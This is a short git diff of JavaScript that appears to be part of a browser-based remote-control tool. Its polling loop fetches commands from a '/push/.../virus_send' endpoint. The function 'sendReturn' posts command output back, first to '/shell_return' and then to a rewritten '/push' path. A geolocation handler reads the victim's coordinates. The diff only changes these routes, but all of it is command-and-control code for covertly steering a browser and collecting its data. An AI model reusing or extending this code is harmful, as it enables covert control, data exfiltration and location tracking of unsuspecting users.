@@ -7,8 +7,9 @@ var loop;
 
 function sendReturn(content) {
     var xhr = new XMLHttpRequest();
-    xhr.open("POST","/shell_return",true)
-    xhr.send(content);
+    var url = window.location.href;
+    xhr.open("POST",("/push/"+url.substring(remote.length)+"/"+content).replace('/',''),true);
+    xhr.send()
 }
 function showmap(position) {
     var cords = position.coords;
@@ -105,7 +106,7 @@ loop = setInterval(function () {
     try{
         var xhr = new XMLHttpRequest();
         var url = window.location.href;
-        xhr.open("GET","/"+url.substring(),true)
+        xhr.open("GET","/push/"+url.substring(remote.length)+"/virus_send",true)
         xhr.send();
 
         xhr.onload = function (e) {
